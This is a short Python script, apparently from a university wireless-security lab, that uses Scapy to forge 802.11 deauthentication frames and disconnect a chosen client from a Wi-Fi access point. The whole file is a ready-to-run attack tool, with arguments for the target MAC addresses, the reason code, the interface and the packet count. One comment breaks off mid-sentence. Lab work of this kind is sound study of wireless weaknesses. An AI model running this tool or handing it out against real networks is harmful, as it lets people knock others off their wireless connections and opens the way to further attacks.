# Source: 
# - https://www.reddit.com/r/HowToHack/comments/6sjo7h/deauth_scappy3_python/ 
# - https://scapy.readthedocs.io/en/latest/api/scapy.layers.dot11.html#scapy.layers.dot11.Dot11Deauth
# - https://stackoverflow.com/questions/4033723/how-do-i-access-command-line-arguments-in-python#4033743
# - https://scapy.readthedocs.io/en/latest/usage.html
# - https://docs.python.org/3/library/argparse.html
# - https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py
# - https://support.zyxel.eu/hc/en-us/articles/360009469759-What-is-the-meaning-of-802-11-Deauthentication-Reason-Codes-
#
# Author: Victor Truan, Jerome Bagnoud | SWI - Labo 01

import argparse
from scapy.all import *

# Arguments
parser = argparse.ArgumentParser(description="This script is sending \'deauth\' packet in order to disconnect user from a Wifi AP (Access Point).")
parser.add_argument("-s", help="the access point MAC Address")
parser.add_argument("-c", help="the client MAC Adress")
parser.add_argument("-r", "--reason",type=int, choices=[1, 4, 5, 8], help="the deauth packet reason type")
parser.add_argument("-i", "--interface", help="the interface on which send the packet")
parser.add_argument("-n", "--number", type=int, default=1, help="the number of packet to send (default=1)")

arguments = parser.parse_args()

sender = ""
receiver = ""

# Reason type 4 is when the client is inactive, type 5 is when the AP is unable to serve client at the moment (too busy), so these message must be send by an AP.
if(arguments.reason == 1 or arguments.reason == 4 or arguments.reason == 5):
    sender = arguments.s
    receiver = arguments.c
# Reason type 8 is when a client is 
else:
    sender = arguments.c
    receiver = arguments.s

# Dot11 -> type 0 is a management frame (deauth packet are management frame), subtype 12 is the subtype for the deauth management frame.
deauthPacket = RadioTap() / Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=arguments.s) / Dot11Deauth(reason=arguments.reason)

print("Sending deauth packet...")

# Sending crafted packet
sendp(deauthPacket, iface=arguments.interface, verbose=False, count=arguments.number)